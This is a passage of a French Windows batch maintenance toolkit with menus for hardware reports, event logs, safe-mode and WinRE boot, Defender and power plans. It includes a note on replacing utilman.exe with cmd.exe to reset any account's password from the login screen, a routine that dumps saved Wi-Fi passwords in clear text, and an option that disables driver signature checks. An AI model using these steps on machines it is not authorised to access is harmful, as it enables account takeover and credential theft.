if /i "%ramconf%"=="O" (
    MdSched.exe
) else (
    echo  Operation annulee.
)
echo.
pause
goto sys_hw_test

:hw_full_report
cls
echo ================================================
echo   RAPPORT COMPLET DES COMPOSANTS
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$cpu=Get-CimInstance Win32_Processor | Select-Object -First 1;" ^
    "$ram=Get-CimInstance Win32_ComputerSystem;" ^
    "$pm=@(Get-CimInstance Win32_PhysicalMemory);" ^
    "$gpu=Get-CimInstance Win32_VideoController;" ^
    "$bios=Get-CimInstance Win32_BIOS;" ^
    "$mb=Get-CimInstance Win32_BaseBoard;" ^
    "$memTypes=@{20='DDR';21='DDR2';24='DDR3';26='DDR4';34='DDR5'};" ^
    "$mtype=if($pm.Count -gt 0 -and $memTypes.ContainsKey($pm[0].SMBIOSMemoryType)){$memTypes[$pm[0].SMBIOSMemoryType]}else{'Inconnu'};" ^
    "$ramGo=[math]::Round($ram.TotalPhysicalMemory/1GB,2);" ^
    "Write-Host '';" ^
    "Write-Host '  PROCESSEUR (CPU)' -f Cyan;" ^
    "Write-Host ('  '+$cpu.Name);" ^
    "Write-Host ('  Coeurs: '+$cpu.NumberOfCores+' | Threads: '+$cpu.NumberOfLogicalProcessors+' | Freq. base: '+$cpu.MaxClockSpeed+' MHz');" ^
    "Write-Host ('  Usage actuel: '+$cpu.LoadPercentage+'%%') -f $(if($cpu.LoadPercentage -lt 70){'Green'}else{'Red'});" ^
    "Write-Host '';" ^
    "Write-Host '  MEMOIRE RAM' -f Cyan;" ^
    "Write-Host ('  '+$ramGo+' Go - Type: '+$mtype+' - Slots utilises: '+$pm.Count);" ^
    "if($pm.Count -gt 0){Write-Host ('  Vitesse: '+$pm[0].Speed+' MHz | Fabricant: '+$pm[0].Manufacturer)};" ^
    "Write-Host '';" ^
    "Write-Host '  CARTE GRAPHIQUE (GPU)' -f Cyan;" ^
    "foreach($g in $gpu){$vram=[math]::Round($g.AdapterRAM/1MB,0); Write-Host ('  '+$g.Name+' ('+$vram+' Mo VRAM) | Pilote: '+$g.DriverVersion)};" ^
    "Write-Host '';" ^
    "Write-Host '  CARTE MERE & BIOS' -f Cyan;" ^
    "Write-Host ('  Fabricant: '+$mb.Manufacturer+' | Modele: '+$mb.Product);" ^
    "Write-Host ('  BIOS: '+$bios.Manufacturer+' v'+$bios.SMBIOSBIOSVersion+' ('+$bios.ReleaseDate+')');" ^
    "Write-Host '';" ^
    "Write-Host '  DISQUES' -f Cyan;" ^
    "Get-PhysicalDisk | ForEach-Object {$s=[math]::Round($_.Size/1GB,1); Write-Host ('  '+$_.FriendlyName+' ('+$_.MediaType+', '+$s+' Go) - Sante: '+$_.HealthStatus) -f $(if($_.HealthStatus -eq 'Healthy'){'Green'}else{'Red'})}"
echo.
pause
goto sys_hw_test

:hw_all
call :hw_smart
call :hw_winsat
call :hw_full_report
goto sys_hw_test

REM ===================================================================
REM              JOURNAUX D'ERREURS WINDOWS FILTRES
REM ===================================================================
:sys_event_log
cls
set "opts=Erreurs critiques (24 dernieres heures)~Affiche les crashes et erreurs graves du jour;Erreurs critiques (7 derniers jours)~Vue hebdomadaire des problemes systeme;Erreurs application (24h)~Logiciels plantes ou en erreur aujourd'hui;Avertissements disque / stockage~Detecte les signes de defaillance materielle"
call :DynamicMenu "JOURNAUX D'ERREURS WINDOWS" "%opts%"
set "ev_choice=%errorlevel%"

if "%ev_choice%"=="0" goto system_tools
if "%ev_choice%"=="1" goto ev_critical_24h
if "%ev_choice%"=="2" goto ev_critical_7d
if "%ev_choice%"=="3" goto ev_app_24h
if "%ev_choice%"=="4" goto ev_disk_warn
goto sys_event_log

:ev_critical_24h
cls
echo ================================================
echo   ERREURS CRITIQUES - 24 DERNIERES HEURES
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$since=(Get-Date).AddHours(-24); $evts=Get-WinEvent -FilterHashtable @{LogName='System';Level=1,2;StartTime=$since} -EA SilentlyContinue | Select-Object -First 30; if(-not $evts){Write-Host '  [OK] Aucune erreur critique dans les 24 dernieres heures.' -f Green} else{Write-Host ('  ' + $evts.Count + ' evenement(s) critique(s):') -f Red; Write-Host ''; foreach($e in $evts){$msg=$e.Message.Split([Environment]::NewLine)[0].Trim(); if($msg.Length -gt 90){$msg=$msg.Substring(0,90)+'...'}; Write-Host ('  [' + $e.TimeCreated.ToString('HH:mm:ss') + '] ID:' + $e.Id + ' | ' + $e.ProviderName + ' | ' + $msg) -f Yellow}}"
echo.
pause
goto sys_event_log

:ev_critical_7d
cls
echo ================================================
echo   ERREURS CRITIQUES - 7 DERNIERS JOURS
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$since=(Get-Date).AddDays(-7); $evts=Get-WinEvent -FilterHashtable @{LogName='System';Level=1,2;StartTime=$since} -EA SilentlyContinue | Select-Object -First 50; if(-not $evts){Write-Host '  [OK] Aucune erreur critique cette semaine.' -f Green} else{Write-Host ('  ' + $evts.Count + ' evenement(s) critique(s) (50 max):') -f Red; Write-Host ''; foreach($e in $evts){$msg=$e.Message.Split([Environment]::NewLine)[0].Trim(); if($msg.Length -gt 90){$msg=$msg.Substring(0,90)+'...'}; Write-Host ('  [' + $e.TimeCreated.ToString('dd/MM HH:mm') + '] ID:' + $e.Id + ' | ' + $e.ProviderName + ' | ' + $msg) -f Yellow}}"
echo.
pause
goto sys_event_log

:ev_app_24h
cls
echo ================================================
echo   ERREURS APPLICATIONS - 24H
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$since=(Get-Date).AddHours(-24); $evts=Get-WinEvent -FilterHashtable @{LogName='Application';Level=1,2;StartTime=$since} -EA SilentlyContinue | Select-Object -First 30; if(-not $evts){Write-Host '  [OK] Aucun crash applicatif dans les 24 dernieres heures.' -f Green} else{Write-Host ('  ' + $evts.Count + ' crash(s) applicatif(s):') -f Red; Write-Host ''; foreach($e in $evts){$msg=$e.Message.Split([Environment]::NewLine)[0].Trim(); if($msg.Length -gt 90){$msg=$msg.Substring(0,90)+'...'}; Write-Host ('  [' + $e.TimeCreated.ToString('HH:mm:ss') + '] ID:' + $e.Id + ' | ' + $e.ProviderName + ' | ' + $msg) -f Yellow}}"
echo.
pause
goto sys_event_log

:ev_disk_warn
cls
echo ================================================
echo   AVERTISSEMENTS DISQUE / STOCKAGE
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$since=(Get-Date).AddDays(-30); $evts=Get-WinEvent -FilterHashtable @{LogName='System';ProviderName='disk','nvme','stornvme','iaStorAV';StartTime=$since} -EA SilentlyContinue | Where-Object {$_.Level -le 3} | Select-Object -First 20; if(-not $evts){Write-Host '  [OK] Aucun avertissement disque detecte (30 derniers jours).' -f Green} else{Write-Host ('  ' + $evts.Count + ' avertissement(s) disque:') -f Yellow; Write-Host ''; foreach($e in $evts){$lv=if($e.Level -eq 2){'ERR'}elseif($e.Level -eq 3){'WARN'}else{'CRIT'}; $msg=$e.Message.Split([Environment]::NewLine)[0].Trim(); if($msg.Length -gt 80){$msg=$msg.Substring(0,80)+'...'}; Write-Host ('  [' + $lv + '][' + $e.TimeCreated.ToString('dd/MM HH:mm') + '] ID:' + $e.Id + ' | ' + $e.ProviderName + ' | ' + $msg) -f $(if($e.Level -eq 2){'Red'}else{'Yellow'})}}"
pause
goto sys_event_log

REM ===================================================================
REM              MODE REPARATION ET DEMARRAGE WINDOWS
REM ===================================================================
:sys_winre
cls
set "opts=WinRE - Reparation directe~Boot dans l environnement de recuperation Windows (outil reagentc);BIOS / UEFI~Acces direct aux parametres firmware de la carte mere;Menu de demarrage (Boot Menu)~Selectionner le peripherique de demarrage (cle USB, disque...);Mode sans echec - Minimal~Demarrer sans pilotes tiers - le plus stable;Mode sans echec - Avec Reseau~Sans pilotes tiers + acces internet;Mode sans echec - Invite CMD~Safe Mode avec ligne de commande a la place de l Explorer;Desactiver signature pilotes~Installer des pilotes non signes (1 demarrage seulement);Verifier statut WinRE~Affiche l etat de l environnement de recuperation + flags bcdedit;Reinitialiser les parametres de demarrage~Supprimer tous les flags bcdedit appliques"
call :DynamicMenu "MODE DEMARRAGE / REPARATION WINDOWS" "%opts%"
set "wr_choice=%errorlevel%"

if "%wr_choice%"=="0" goto system_tools
if "%wr_choice%"=="1" goto winre_boot
if "%wr_choice%"=="2" goto winre_bios
if "%wr_choice%"=="3" goto winre_bootmenu
if "%wr_choice%"=="4" goto winre_safe_minimal
if "%wr_choice%"=="5" goto winre_safe_network
if "%wr_choice%"=="6" goto winre_safe_cmd
if "%wr_choice%"=="7" goto winre_nosign
if "%wr_choice%"=="8" goto winre_status
if "%wr_choice%"=="9" goto winre_reset
goto sys_winre

:winre_boot
cls
echo.
echo  ================================================
echo   DEMARRAGE DANS WINRE (Environnement Reparation)
echo  ================================================
echo  Acces direct : Reparation / Restauration / CMD
echo  Redemarrage dans 5 secondes...
echo.
reagentc /boottore >nul 2>&1
if %errorlevel% neq 0 (
    echo  [ERREUR] WinRE indisponible sur ce PC.
    echo  Conseil : verifiez avec "Verifier statut WinRE".
    pause & goto sys_winre
)
echo  [OK] WinRE programme pour le prochain demarrage.
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_bios
cls
echo.
echo  ================================================
echo   DEMARRAGE DANS LE BIOS / UEFI
echo  ================================================
echo  Acces direct au firmware de la carte mere.
echo  Redemarrage dans 5 secondes...
timeout /t 5 /nobreak >nul
shutdown /r /fw /t 0 & exit

:winre_bootmenu
cls
echo.
echo  ================================================
echo   MENU DE DEMARRAGE (BOOT MENU)
echo  ================================================
echo  Permet de choisir le peripherique de boot
echo  (cle USB, disque externe, lecteur reseau...).
echo.
echo  [1/2] Activation du boot menu...
bcdedit /set {bootmgr} displaybootmenu yes >nul 2>&1
echo  [2/2] Redemarrage dans 5 secondes...
echo.
echo  NOTE : Le boot menu sera desactive apres 1 boot
echo  normal pour ne pas alourdir le demarrage.
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_safe_minimal
cls
echo.
echo  ================================================
echo   MODE SANS ECHEC - MINIMAL
echo  ================================================
echo  Pilotes de base uniquement. Le plus stable.
echo  Ce script se relancera pour restaurer le mode normal.
echo  Redemarrage dans 5 secondes...
bcdedit /set {current} safeboot minimal >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_safe_network
cls
echo.
echo  ================================================
echo   MODE SANS ECHEC - AVEC RESEAU
echo  ================================================
echo  Pilotes de base + acces internet disponible.
echo  Ce script se relancera pour restaurer le mode normal.
echo  Redemarrage dans 5 secondes...
bcdedit /set {current} safeboot network >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_safe_cmd
cls
echo.
echo  ================================================
echo   MODE SANS ECHEC - INVITE DE COMMANDES
echo  ================================================
echo  Safe Mode avec shell CMD au lieu de l Explorer.
echo  Ce script se relancera pour restaurer le mode normal.
echo  Redemarrage dans 5 secondes...
bcdedit /set {current} safeboot minimal >nul 2>&1
bcdedit /set {current} safebootalternateshell yes >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_nosign
cls
echo.
echo  ================================================
echo   DESACTIVATION SIGNATURE PILOTES (1 BOOT)
echo  ================================================
echo  Permet d installer des pilotes non signes
echo  lors du prochain demarrage uniquement.
echo  Redemarrage dans 5 secondes...
bcdedit /set {current} nointegritychecks on >nul 2>&1
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_status
cls
echo.
echo  ================================================
echo   STATUT WINRE ET PARAMETRES BCDEDIT
echo  ================================================
echo.
reagentc /info
echo.
echo  --- Parametres de demarrage actifs (bcdedit) ---
bcdedit /enum {current} | findstr /i "safeboot nointegritychecks safebootalternate bootmenupolicy"
echo.
pause
goto sys_winre

:winre_reset
cls
echo.
echo  ================================================
echo   REINITIALISATION DES PARAMETRES DE DEMARRAGE
echo  ================================================
echo.
echo  Suppression des flags appliques (safeboot, nosign...)
bcdedit /deletevalue {current} safeboot >nul 2>&1
bcdedit /deletevalue {current} safebootalternateshell >nul 2>&1
bcdedit /deletevalue {current} nointegritychecks >nul 2>&1
bcdedit /set {bootmgr} displaybootmenu no >nul 2>&1
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /f >nul 2>&1
echo  [OK] Tous les parametres de demarrage ont ete reinitialises.
echo  [OK] RunOnce nettoye.
echo.
pause
goto sys_winre


REM ===================================================================
REM              EXPORT WI-FI + LOGICIELS (COMBO TXT BUREAU)
REM ===================================================================
:sys_export_wifi_apps
cls
echo ================================================
echo   EXPORT Wi-Fi + Logiciels - Fichiers TXT Bureau
echo ================================================
echo.
echo  [1/2] Export de la liste des logiciels...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%USERPROFILE%\Desktop\Logiciels_Installes.txt'; $p=@('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'); $apps=($p | ForEach-Object { Get-ItemProperty $_ -EA SilentlyContinue } | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher -Unique); $nl=[Environment]::NewLine; $sep=New-Object string '=',60; $h='LOGICIELS INSTALLES - '+(Get-Date -Format 'dd/MM/yyyy HH:mm')+$nl+'Ordinateur : '+$env:COMPUTERNAME+$nl+'Total      : '+$apps.Count+' logiciels'+$nl+$sep; $h | Out-File $f -Encoding UTF8; $apps | ForEach-Object { '[+] '+$_.DisplayName+' v'+$_.DisplayVersion+' | '+$_.Publisher } | Out-File $f -Encoding UTF8 -Append; Write-Host ('  [OK] '+$apps.Count+' logiciels exportes.') -f Green"
echo.
echo  [2/2] Export des mots de passe Wi-Fi...
echo.
set "FWIFI=%USERPROFILE%\Desktop\Mots_de_passe_WiFi.txt"
> "%FWIFI%" echo Mots de passe Wi-Fi - %date% %time%
>> "%FWIFI%" echo Ordinateur : %COMPUTERNAME%
>> "%FWIFI%" echo ============================================================
setlocal enabledelayedexpansion
set "wifi_found=0"
for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /C:"Profil Tous" /C:"All User Profile"') do (
    set "ssid=%%I"
    set "ssid=!ssid:~1!"
    if not "!ssid!"=="" (
        set "wifi_found=1"
        set "pwd="
        for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Contenu de la cl" /C:"Key Content"') do (
            set "pwd=%%K"
        )
        set "pwd=!pwd:~1!"
        if "!pwd!"=="" set "pwd=(Aucun / Reseau ouvert)"
        >> "%FWIFI%" echo [+] SSID : !ssid!
        >> "%FWIFI%" echo     MDP  : !pwd!
        >> "%FWIFI%" echo.
        echo  [+] !ssid!
    )
)
endlocal
echo.
echo ================================================
if exist "%USERPROFILE%\Desktop\Logiciels_Installes.txt" echo  [OK] Logiciels_Installes.txt cree sur le Bureau
if exist "%USERPROFILE%\Desktop\Mots_de_passe_WiFi.txt"  echo  [OK] Mots_de_passe_WiFi.txt  cree sur le Bureau
echo ================================================
echo.
pause
goto sys_export_menu

REM ===================================================================
REM              MODE SANS ECHEC (TOGGLE) - CORRIGE
REM ===================================================================
:sys_safemode
cls
REM === Supprimer RunOnce EN PREMIER pour eviter toute boucle ===
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /f >nul 2>&1

if not defined SAFEBOOT_OPTION goto safemode_config

REM =====================================================
REM  ON EST EN MODE SANS ECHEC -> MENU RETOUR
REM =====================================================
color 0E
set "opts=Revenir en mode NORMAL~Restaurer le demarrage standard et redemarrer le PC;Quitter~Rester en mode sans echec et fermer ce script"
call :DynamicMenu "MODE SANS ECHEC ACTIF - Type: %SAFEBOOT_OPTION%" "%opts%"
set "sm_res=%errorlevel%"

if "%sm_res%"=="0" (
    echo.
    echo  Pour revenir en mode normal plus tard, relancez ce script.
    pause
    exit
)
if "%sm_res%"=="1" goto safemode_revert
if "%sm_res%"=="2" (
    echo.
    echo  Pour revenir en mode normal plus tard, relancez ce script.
    pause
    exit
)
goto sys_safemode

:safemode_revert
cls
echo.
echo  [1/2] Suppression de la config mode sans echec...
bcdedit /deletevalue {current} safeboot >nul 2>&1
if %errorlevel%==0 (
    echo  [OK] Mode normal restaure.
) else (
    echo  [INFO] Deja en mode normal ou erreur bcdedit.
)
echo  [2/2] Redemarrage dans 5 secondes...
echo.
echo  ================================================
echo  [OK] Le PC va redemarrer NORMALEMENT.
echo  ================================================
timeout /t 5 /nobreak >nul
shutdown /r /t 0
exit

REM =====================================================
REM  ON EST EN MODE NORMAL -> ACTIVATION SAFE MODE
REM =====================================================
:safemode_config
color 0B
set "opts=Mode Minimal~Pilotes de base uniquement - le plus stable;Avec Reseau~Acces internet disponible (Wi-Fi ou Ethernet)"
call :DynamicMenu "MODE SANS ECHEC - Choisissez le type de demarrage" "%opts%"
set "sm_cfg=%errorlevel%"

if "%sm_cfg%"=="0" goto system_tools
if "%sm_cfg%"=="1" set "SM_TYPE=minimal"
if "%sm_cfg%"=="2" set "SM_TYPE=network"
if not defined SM_TYPE goto safemode_config

cls
echo.
echo  [1/3] Configuration bcdedit (%SM_TYPE%)...
bcdedit /set {current} safeboot %SM_TYPE% >nul 2>&1
if %errorlevel% neq 0 (
    echo  [ERREUR] bcdedit a echoue. Droits insuffisants ?
    pause
    goto system_tools
)
echo  [OK] Mode sans echec (%SM_TYPE%) programme.

echo  [2/3] Inscription RunOnce pour restauration automatique...
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
echo  [OK] Script inscrit au demarrage automatique.

echo  [3/3] Redemarrage dans 5 secondes...
echo.
echo  ================================================
echo  APRES LE REDEMARRAGE :
echo  - Windows demarrera en MODE SANS ECHEC
echo  - Ce script se relancera automatiquement
echo  - Selectionnez "Revenir en mode NORMAL"
echo  ================================================
timeout /t 5 /nobreak >nul
shutdown /r /t 0
exit


REM ===================================================================
REM                    SORTIE DU SCRIPT
REM ===================================================================
:exit_script
cls
echo ======================================================
echo     MERCI D'AVOIR UTILISE CET OUTIL !
echo ======================================================
echo.
echo Developpe par ALEEXLEDEV
echo.
echo Appuyez sur une touche pour quitter...
pause >nul
exit

:DynamicMenu
:: Arguments: %1="Titre", %2="Option1;Option2;Option3"
:: Retourne: ERRORLEVEL (1, 2, 3...) ou 0 pour Echap/Retour
setlocal
set "m_title=%~1"
set "m_opts=%~2"

set "ps_code=$o=($env:m_opts -split ';');$t=$env:m_title;$sel=@();for($i=0;$i -lt $o.Count;$i++){if($o[$i] -notmatch '^\[---'){$sel+=$i}};$sIdx=0;$pad=115;try{if([console]::WindowWidth -gt 5){$pad=[math]::Min([console]::WindowWidth-5, 115)}}catch{};$maxV=50;try{if([console]::WindowHeight -gt 0){$maxV=[math]::Max([console]::WindowHeight-10, 10)}}catch{};$topI=0;clear-host;try{$cY=[console]::WindowTop}catch{$cY=0};function D{ try{[console]::SetCursorPosition(0,$cY)}catch{};write-host '  ========================================================================================' -f Cyan;write-host ('   ' + $t) -f White;write-host '  ========================================================================================' -f Cyan;write-host (' '.PadRight($pad));$num=1;$printed=0;for($i=0;$i -lt $o.Count;$i++){$parts=$o[$i]-split'~';$s=$parts[0];$d='';if($parts.Count -gt 1){$d=$parts[1]};$isH=($s -match '^\[---');if(-not $isH){$cNum=$num;$num++};if($i -lt $topI -or $printed -ge $maxV){continue};if($isH){write-host (' '.PadRight($pad));$printed++;if($printed -lt $maxV){write-host ('       ' + $s).PadRight($pad) -f Cyan;$printed++}}else{$f_str='    ';if($s -match '^\(F\) '){$f_str='(F) ';$s=$s.Substring(4)};if($i -eq $sel[$sIdx]){$str='{0}>> [{1}] {2}  ' -f $f_str, $cNum, $s; write-host $str -NoNewline -f Black -b White; $rem=$pad-$str.Length; if($rem -lt 0){$rem=0}; $ds=if($d){'   - '+$d}else{''}; if($ds.Length -gt $rem){$ds=$ds.Substring(0,$rem)}; write-host $ds.PadRight($rem) -f Yellow}else{$str='{0}   [{1}] {2}  ' -f $f_str, $cNum, $s; write-host $str.PadRight($pad) -f Gray};$printed++}};while($printed -lt $maxV){write-host (' '.PadRight($pad));$printed++};write-host (' '.PadRight($pad));write-host '  ----------------------------------------------------------------------------------------' -f Cyan;write-host '   [FLECHES] Naviguer | [ENTREE] Valider | [F] Favoriser | [S] Rechercher | [0/ECHAP] Retour    ' -NoNewline -f DarkGray};while($true){$target=$sel[$sIdx];if($target -lt $topI){$topI=$target};$lines=0;for($i=$topI;$i -le $target;$i++){if($o[$i] -match '^\[---'){$lines+=2}else{$lines+=1}};while($lines -gt $maxV){if($o[$topI] -match '^\[---'){$lines-=2}else{$lines-=1};$topI++};D;$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');$v=$k.VirtualKeyCode;if($v -eq 38){$sIdx--;if($sIdx -lt 0){$sIdx=$sel.Count-1}}elseif($v -eq 40){$sIdx++;if($sIdx -ge $sel.Count){$sIdx=0}}elseif($v -eq 13){clear-host;exit ($sIdx+1)}elseif($v -eq 27 -or $k.Character -eq '0'){clear-host;exit 0}elseif($v -eq 70){clear-host;exit (200+$sIdx+1)}elseif($k.Character -eq 'S' -or $k.Character -eq 's'){clear-host;exit 299}elseif([string]$k.Character -match '^[1-9]$' -and [int][string]$k.Character -le $sel.Count){clear-host;exit ([int][string]$k.Character)}}"

powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_code%"
set "res=%errorlevel%"
exit /b %res%


:sys_unlock_notes
cls
echo ===============================================
echo   NOTE: Debloquer une session Windows (WinRE)
echo ===============================================
echo.
echo 1^) Demarrer sur une cle USB Windows ^(WinRE/WinPE^) puis ouvrir l'invite de commande.
echo.
echo 2^) Identifier la lettre du disque contenant Windows:
echo    ^> diskpart
echo    ^> list volume
echo    Reperer le volume ou se trouve le dossier \Windows ^(ex: Z:^)
echo.
echo    S'il n'y en a pas ^(pas de lettre sur le volume Windows^):
echo    ^> select volume X
echo    ^> assign letter=Z
echo    ^> exit
echo.
echo 3^) Verifier la presence des fichiers cibles:
echo    ^> dir Z:\windows\system32\cmd.exe
echo    ^> dir Z:\windows\system32\utilman.exe
echo.
echo 4^) Remplacer utilman.exe par cmd.exe ^(sauvegarder si besoin avant^):
echo    ^(Optionnel^) Sauvegarde:
echo    ^> copy Z:\windows\system32\utilman.exe Z:\windows\system32\utilman.exe.bak
echo    Remplacement:
echo    ^> copy Z:\windows\system32\cmd.exe Z:\windows\system32\utilman.exe
echo    Tapez O ^(Oui^) si demande pour remplacer.
echo.
echo 5^) Redemarrer le PC normalement.
echo.
echo 6^) A l'ecran de connexion, cliquer sur le bouton "Ergonomie" ^(facilites d'acces^):
echo    Une fenetre CMD s'ouvre avec privileges systeme.
echo.
echo 7^) Changer le mot de passe du compte desire:
echo    ^> net user nom_utilisateur nouveau_motdepasse
echo    Exemple:
echo    ^> net user martin 123456
echo.
echo 8^) ^(Recommande^) Restaurer utilman.exe d'origine apres recuperation:
echo    ^> copy Z:\windows\system32\utilman.exe.bak Z:\windows\system32\utilman.exe
echo.
echo 9^) Securite:
echo    - N'effectuer ces operations que si vous etes autorise.
echo    - Supprimer la sauvegarde .bak et activer des protections ^(BitLocker, etc.^).
echo.
pause
goto system_tools

REM ===================================================================
REM              GESTIONNAIRE WINDOWS DEFENDER
REM ===================================================================
:sys_defender
cls
set "opts=Scan Rapide~Analyse zones critiques (2-5 min);Scan Complet~Analyse tout le disque (peut durer 1h+);Mettre a jour les Signatures~Telecharger les dernieres definitions virus;Voir les Menaces Detectees~Liste des virus et malwares trouves sur ce PC;Statut Protection en Temps Reel~Affiche l etat complet de la protection Defender"
call :DynamicMenu "GESTIONNAIRE WINDOWS DEFENDER" "%opts%"
set "wd_c=%errorlevel%"
if "%wd_c%"=="0" goto system_tools
if "%wd_c%"=="1" goto wd_quick
if "%wd_c%"=="2" goto wd_full
if "%wd_c%"=="3" goto wd_update
if "%wd_c%"=="4" goto wd_threats
if "%wd_c%"=="5" goto wd_status
goto sys_defender

:wd_quick
cls
echo.
echo  [DEFENDER] Lancement du scan rapide...
echo  Appuyez sur Ctrl+C pour interrompre.
echo.
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -Scan -ScanType 1
echo.
echo  [OK] Scan rapide termine.
pause & goto sys_defender

:wd_full
cls
echo.
echo  [DEFENDER] Lancement du scan COMPLET...
echo  Cela peut prendre 30min a 2h selon le disque.
echo  Appuyez sur Ctrl+C pour interrompre.
echo.
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -Scan -ScanType 2
echo.
echo  [OK] Scan complet termine.
pause & goto sys_defender

:wd_update
cls
echo.
echo  [DEFENDER] Mise a jour des signatures en cours...
echo.
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -SignatureUpdate
echo.
echo  [OK] Signatures mises a jour.
pause & goto sys_defender

:wd_threats
cls
echo.
echo  ================================================
echo   MENACES DETECTEES (historique)
echo  ================================================
echo.
powershell -NoProfile -Command "$t=Get-MpThreatDetection -EA SilentlyContinue; if(-not $t){Write-Host '  [OK] Aucune menace detectee !' -f Green}else{$t | Select-Object @{N='Date';E={$_.InitialDetectionTime.ToString('dd/MM HH:mm')}},@{N='Menace';E={(Get-MpThreat -ThreatID $_.ThreatID -EA SilentlyContinue).ThreatName}},@{N='Statut';E={if($_.ActionSuccess){'Neutralisee'}else{'ACTIVE'}}} | Format-Table -AutoSize | Out-String | Write-Host}"
echo.
pause & goto sys_defender

:wd_status
cls
echo.
echo  ================================================
echo   STATUT WINDOWS DEFENDER
echo  ================================================
echo.
powershell -NoProfile -Command "Get-MpComputerStatus -EA SilentlyContinue | Select-Object @{N='Protection TR';E={$_.RealTimeProtectionEnabled}},@{N='Antivirus';E={$_.AntivirusEnabled}},@{N='Antispyware';E={$_.AntispywareEnabled}},@{N='Version Def.';E={$_.AntispywareSignatureVersion}},@{N='Derniere MAJ';E={$_.AntispywareSignatureLastUpdated.ToString('dd/MM/yyyy HH:mm')}} | Format-List | Out-String | Write-Host"
echo.
pause & goto sys_defender

REM ===================================================================
REM              PLAN D'ALIMENTATION
REM ===================================================================
:sys_power_plan
cls
set "opts=Mode Equilibre (Defaut)~Recommande pour usage quotidien (batterie + perf);Mode Economies d'Energie~Reduit les performances pour maximiser l'autonomie;Mode Performances Elevees~Priorite aux performances, consommation accrue;Mode Ultimate Performance (Cache)~Mode Windows cache - eliminines les micro-latences, ideal gaming/pro;Voir le Plan Actif~Affiche quel plan d'alimentation est actuellement actif;Lister tous les Plans~Voir tous les plans disponibles sur ce PC"
call :DynamicMenu "GESTIONNAIRE PLAN D'ALIMENTATION" "%opts%"
set "pp_c=%errorlevel%"
if "%pp_c%"=="0" goto system_tools
if "%pp_c%"=="1" goto pp_balanced
if "%pp_c%"=="2" goto pp_saver
if "%pp_c%"=="3" goto pp_high
if "%pp_c%"=="4" goto pp_ultimate
if "%pp_c%"=="5" goto pp_current
if "%pp_c%"=="6" goto pp_list
goto sys_power_plan

:pp_balanced
powercfg /setactive 381b4222-f694-41f0-9685-ff5bb260df2e >nul 2>&1
echo  [OK] Plan Equilibre active.
timeout /t 2 /nobreak >nul & goto sys_power_plan

:pp_saver
powercfg /setactive a1841308-3541-4fab-bc81-f71556f20b4a >nul 2>&1
echo  [OK] Plan Economies d'Energie active.
timeout /t 2 /nobreak >nul & goto sys_power_plan

:pp_high
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >nul 2>&1
echo  [OK] Plan Performances Elevees active.
timeout /t 2 /nobreak >nul & goto sys_power_plan

:pp_ultimate
cls
echo.
echo  ================================================
echo   ACTIVATION ULTIMATE PERFORMANCE (mode cache)
echo  ================================================
echo.
echo  Ce plan elimine les micro-latences et desactive
echo  les mecanismes d'economie d'energie.
echo  Ideal pour : Gaming, Creation, Workstation Pro.
echo.
echo  [1/2] Creation du plan (si absent)...
powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul 2>&1
echo  [2/2] Activation du plan Ultimate Performance...
for /f "tokens=4" %%G in ('powercfg /list ^| findstr /i "ultimate\|performances optimales"') do (
    powercfg /setactive %%G >nul 2>&1
)
echo.
echo  [OK] Mode Ultimate Performance ACTIVE !
echo  Visible dans : Parametres > Alimentation et veille > Parametres d'alimentation supplementaires
echo.
pause & goto sys_power_plan

:pp_current
cls
echo.
echo  Plan d'alimentation actif :
powercfg /getactivescheme
echo.
pause & goto sys_power_plan

:pp_list
cls
echo.
echo  Plans d'alimentation disponibles :
powercfg /list
echo.
pause & goto sys_power_plan

REM ===================================================================
REM              MENU DE NETTOYAGE ET OPTIMISATION
REM ===================================================================
:sys_opti_menu
cls
set "opts=[--- NETTOYAGE ET MAINTENANCE ---]"
set "opts=%opts%;Nettoyage Complet Unifie~Ouvre le panneau de nettoyage complet (Disque, Temp, WU, DNS...)"
set "opts=%opts%;Nettoyage du Registre~Optimisation rapide et suppression des entrees mortes"
